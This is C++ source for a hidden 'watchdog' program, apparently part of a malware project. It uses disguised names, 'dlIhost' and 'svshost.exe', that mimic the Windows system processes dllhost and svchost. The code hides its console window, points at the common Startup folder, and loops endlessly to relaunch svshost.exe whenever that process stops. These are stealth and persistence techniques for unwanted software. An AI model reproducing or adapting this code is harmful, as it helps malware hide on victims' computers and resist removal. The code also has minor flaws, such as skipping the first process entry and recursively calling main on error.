// dlIhost - Watchdog process

#include <fstream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj.h>

#define MainExecutableName "svshost.exe"

char MainExecutablePath[0x00100];
const char MainExeNameA[0x0000D] = "\\svshost.exe";

using namespace std;

int main(){

	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);

	try{

		// Obtaining the paths
		LPITEMIDLIST Pidl;
		long hResult;
		hResult = SHGetSpecialFolderLocation(0, 0x00018, &Pidl); // use 18 for common startup
		if (hResult == 0) hResult = SHGetPathFromIDList(Pidl, MainExecutablePath);
		strcat(MainExecutablePath, MainExeNameA);

		while (1){

			// Looking for main executable process
			bool RUNNING_FLAG = 0;
			PROCESSENTRY32 entry;
			entry.dwSize = sizeof(PROCESSENTRY32);
			HANDLE snapshot = CreateToolhelp32Snapshot(0x00002, 0);
			if (Process32First(snapshot, &entry) == 1){
				while (Process32Next(snapshot, &entry) == 1){
					if (strcmp(entry.szExeFile, MainExecutableName) == 0){
						RUNNING_FLAG = 1;
						break;
					}
				}
			}
			if (!RUNNING_FLAG) ShellExecute(0, 0, LPCSTR(MainExecutablePath), 0, 0, 0);
			Sleep(1);

		}
	}
	catch (const char * msg){
		main();
	}

	return 0;
}